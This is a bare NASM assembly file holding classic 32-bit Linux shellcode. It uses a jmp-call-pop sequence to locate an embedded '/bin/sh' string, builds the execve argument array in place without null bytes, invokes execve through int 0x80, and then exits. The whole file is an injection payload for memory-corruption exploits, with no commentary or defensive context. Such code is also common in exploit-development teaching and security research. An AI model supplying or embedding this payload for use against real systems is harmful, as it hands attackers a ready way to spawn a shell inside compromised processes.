BITS 32
section .text

_start:
	
	jmp short mes_addr
	
back:
	xor eax, eax
	cdq
	
	
	
	
	pop ebx
	mov [ebx+7], al
	mov [ebx+8], ebx
	mov [ebx+12], eax
	lea ecx, [ebx+8]
	lea edx, [ebx+12]
	mov al, 11
	int 80h
	
	
	
	xor eax, eax
	xor ebx, ebx
	mov al, 1
	int 80h
	
	
mes_addr:
	call back
	mes db "/bin/sh"
	
	
section .data